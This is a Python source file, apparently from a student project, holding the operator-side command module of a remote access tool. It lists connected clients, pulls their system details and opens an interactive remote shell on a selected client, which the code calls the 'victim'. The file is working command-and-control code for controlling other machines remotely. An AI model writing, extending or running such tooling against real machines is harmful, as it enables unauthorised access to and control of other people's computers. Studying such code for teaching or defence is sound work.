# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    commands.py                                        :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: TheRed <TheRed@students.42.fr>             +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2024/07/22 00:20:32 by TheRed            #+#    #+#              #
#    Updated: 2024/07/22 00:20:32 by TheRed           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import threading
import json
import sys

class Command:
	def __init__(self, server) -> None:
		from server import Server

		self.server:	Server = server

	def command(self, command_name: str, args: list) -> None:
		print("\n")
		command_list = dir(self)
		
		if command_name in command_list:
			getattr(self, command_name)(args)

	def use(self, args: list) -> None:
		if len(args) == 0:
			print("Usage: use <client_id>")
			return

		client_id = int(args[0])
		if client_id >= len(self.server.clients):
			print("Invalid client_id")
			return

		self.server.client_id = client_id
		print(f"Using client {client_id}\n")

	def information(self, args: list) -> None:
		client = self.server.clients[self.server.client_id]
		client.sendData("command", ["information", []])

		printer = self.server.printer
		
		response = client.recv()
		if not response:
			printer.bad(f"{self.server.client_id} : {client.addr} disconnected\n")
			return

		info = json.loads(response)

		printer.good(f"{info['name']}")
		printer.info(f" - OS: {info['platform']}")
		printer.info(f" - IP: {client.addr[0]}")
		printer.info(f" - Architecture: {info['architecture'][0]}")
		printer.info(f" - Processor: {info['processor']}")
		printer.info(f" - RAM: {info['ram']}")


		print("\n")

	def list(self, args: list) -> None:
		before_id = self.server.client_id

		for id in range(0, len(self.server.clients)):
			self.server.client_id = id
			self.information([])

		self.server.client_id = before_id
	def shell(self, args: list) -> None:
		victim = self.server.clients[self.server.client_id]
		victim.sendData("command", ["shell", []])

		def receive_shell():
			while True:
				response = victim.recv(decoding="cp850")
				if not response or response == "EXIT":
					break
				print(response, end="")
				sys.stdout.flush()
		
		threading.Thread(target=receive_shell, daemon=True).start()

		has_sent = True
		while has_sent:
			command = input()
			has_sent = victim.send(command)
			
			if command == "EXIT":
				break